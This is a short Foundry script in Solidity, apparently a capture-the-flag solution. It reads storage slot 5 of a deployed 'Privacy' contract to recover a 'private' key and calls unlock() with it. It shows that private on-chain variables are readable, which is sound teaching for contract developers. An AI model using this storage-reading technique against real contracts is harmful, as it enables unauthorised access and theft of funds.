// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import {Privacy} from "../src/Privacy.sol";

contract CounterScript is Script {
    Privacy public privacy = Privacy(0xd378080412a1b7D77e1f67ceB2339B0aF44caD55);
    

    function run() public {
        vm.startBroadcast();
        bytes32 myKey = vm.load(address(privacy),bytes32(uint256(5)));
        privacy.unlock(bytes16(myKey));
        vm.stopBroadcast();
    }
}
